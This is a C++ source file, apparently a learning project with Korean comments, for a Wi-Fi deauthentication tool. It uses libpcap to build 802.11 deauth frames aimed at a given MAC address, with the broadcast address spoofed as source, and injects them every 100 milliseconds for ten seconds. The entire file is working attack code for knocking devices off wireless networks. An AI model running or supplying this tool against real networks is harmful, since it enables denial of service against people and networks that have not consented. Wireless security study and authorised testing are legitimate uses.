#include <stdio.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <pcap.h>
#include <memory>
#include <string>
#include <chrono>
#include <thread>
#include "deauthdr.h"
#include "mac.h"

using namespace std;

void usage()
{
    printf("syntax: deauth <interface> <macAddress> [-c <macAddress>]\n");
    printf("sample: deauth wlan0 AA:BB:CC:DD:EE:FF\n");
}

int main(int argc, char *argv[])
{
    if (argc < 3)
    {
        usage();
        return -1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    char *dev = argv[1];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    Mac dmac(argv[2]);
    Mac broadmac(Mac::broadcastMac());

    std::unique_ptr<dot11>
        radio_hdr(new dot11);

    std::unique_ptr<deauthframe> deauth_hdr(new deauthframe);
    std::unique_ptr<deauthbody> deauth_body(new deauthbody);

    deauth_hdr->subtype = 0x00c0;
    deauth_hdr->dur = 0;
    memcpy(deauth_hdr->smac, static_cast<uint8_t *>(broadmac), Mac::SIZE);
    memcpy(deauth_hdr->dmac, static_cast<uint8_t *>(dmac), Mac::SIZE);
    memcpy(deauth_hdr->bssid, static_cast<uint8_t *>(dmac), Mac::SIZE);
    deauth_hdr->flagseq = 0;

    deauth_body->fixedparam = 0x0007;

    deauthpkt deauth_pkt; // 유니크 포인터 대신 일반 객체 사용
    deauth_pkt.radio_hdr = *radio_hdr;
    deauth_pkt.deauth_hdr = *deauth_hdr;
    deauth_pkt.deauth_body = *deauth_body;

    // 현재 시간을 기록
    auto start = std::chrono::steady_clock::now();

    while (true)
    {

        printf("패킷 쏜다~!\n");
        if (pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&deauth_pkt), sizeof(deauth_pkt)) != 0)
        {
            fprintf(stderr, "Error sending the packet: %s\n", pcap_geterr(handle));
        }

        // 0.1초 대기
        std::this_thread::sleep_for(std::chrono::milliseconds(100));

        // 10초가 지났는지 확인
        auto end = std::chrono::steady_clock::now();
        if (std::chrono::duration_cast<std::chrono::seconds>(end - start).count() >= 10)
            break;
    }

    return 0;
}
